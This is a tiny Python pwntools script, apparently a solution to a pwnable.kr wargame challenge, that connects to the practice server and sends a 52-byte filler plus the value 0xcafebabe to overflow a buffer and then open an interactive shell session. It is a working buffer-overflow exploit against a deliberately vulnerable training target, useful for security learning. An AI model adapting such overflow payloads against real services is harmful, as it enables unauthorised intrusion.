#!/usr/bin/python3

from pwn import *

c=remote("pwnable.kr",9000)
c.sendline(b"AAAA"*13+p32(0xcafebabe))
c.interactive()